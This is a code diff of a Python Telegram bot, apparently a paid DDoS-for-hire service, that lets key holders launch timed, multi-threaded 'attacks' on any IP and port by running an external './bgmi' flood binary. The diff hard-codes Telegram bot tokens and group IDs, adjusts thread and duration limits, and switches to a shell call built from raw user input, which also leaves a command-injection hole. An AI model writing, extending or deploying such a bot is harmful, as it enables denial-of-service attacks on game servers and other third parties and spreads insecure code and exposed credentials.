@@ -18,11 +18,11 @@ logging.basicConfig(
 )
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7694477480:AAHfV8Ih8LWcf4CwuqsdhRZmPzZZtUXOyaM'  # Replace with your bot token
+TELEGRAM_BOT_TOKEN = '7064980384:AAGfNFTaf81DF3P4NLhHm0TRBSEV1XfBATw'  # Replace with your bot token
 OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
-ALLOWED_GROUP_ID = -1002283210199  # Replace with your allowed group ID
-MAX_THREADS = 2000  # Default max threads
-max_duration = 200  # Default max attack duration
+ALLOWED_GROUP_ID = -1002295161013  # Replace with your allowed group ID
+MAX_THREADS = 1500  # Default max threads
+max_duration = 150  # Default max attack duration
 
 # File to store key data
 KEY_FILE = "keys.txt"
@@ -279,28 +279,6 @@ async def attack_start(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *You need a valid key to start an attack! Use /redeemkey to redeem a key.*", parse_mode='Markdown')
         return ConversationHandler.END  # Terminate the conversation
 
-# Function to handle the attack in a separate process
-async def execute_bgmi(ip, port, duration, threads):
-    try:
-        # Execute the external binary with the provided arguments
-        process = await asyncio.create_subprocess_exec(
-            "./bgmi", ip, port, str(duration), str(threads),
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-
-        # Wait for the process to complete
-        stdout, stderr = await process.communicate()
-
-        # Log the output (optional)
-        if stdout:
-            logging.info(f"stdout: {stdout.decode()}")
-        if stderr:
-            logging.error(f"stderr: {stderr.decode()}")
-
-    except Exception as e:
-        logging.error(f"Error executing ./bgmi: {e}")
-
 # Attack Command - Handle Attack Input
 async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time
@@ -334,8 +312,35 @@ async def attack_input(update: Update, context: CallbackContext):
         parse_mode='Markdown'
     )
 
-    # Execute the external binary with the provided arguments
-    await execute_bgmi(ip, port, duration, threads)
+    # Execute the external binary asynchronously
+    process = await asyncio.create_subprocess_shell(
+        f"./bgmi {ip} {port} {duration} {threads}",
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE
+    )
+
+    # Wait for the process to complete
+    stdout, stderr = await process.communicate()
+
+    # Check if the process was successful
+    if process.returncode == 0:
+        await update.message.reply_text(
+            f"✅ *Attack Finished!*\n"
+            f"🎯 *Target*: {ip}:{port}\n"
+            f"🕒 *Duration*: {duration} sec\n"
+            f"🧵 *Threads*: {threads}\n"
+            f"🔥 *The battlefield is now silent.*",
+            parse_mode='Markdown'
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ *Attack Failed!*\n"
+            f"🎯 *Target*: {ip}:{port}\n"
+            f"🕒 *Duration*: {duration} sec\n"
+            f"🧵 *Threads*: {threads}\n"
+            f"💥 *Error*: {stderr.decode().strip()}",
+            parse_mode='Markdown'
+        )
 
     return ConversationHandler.END
 
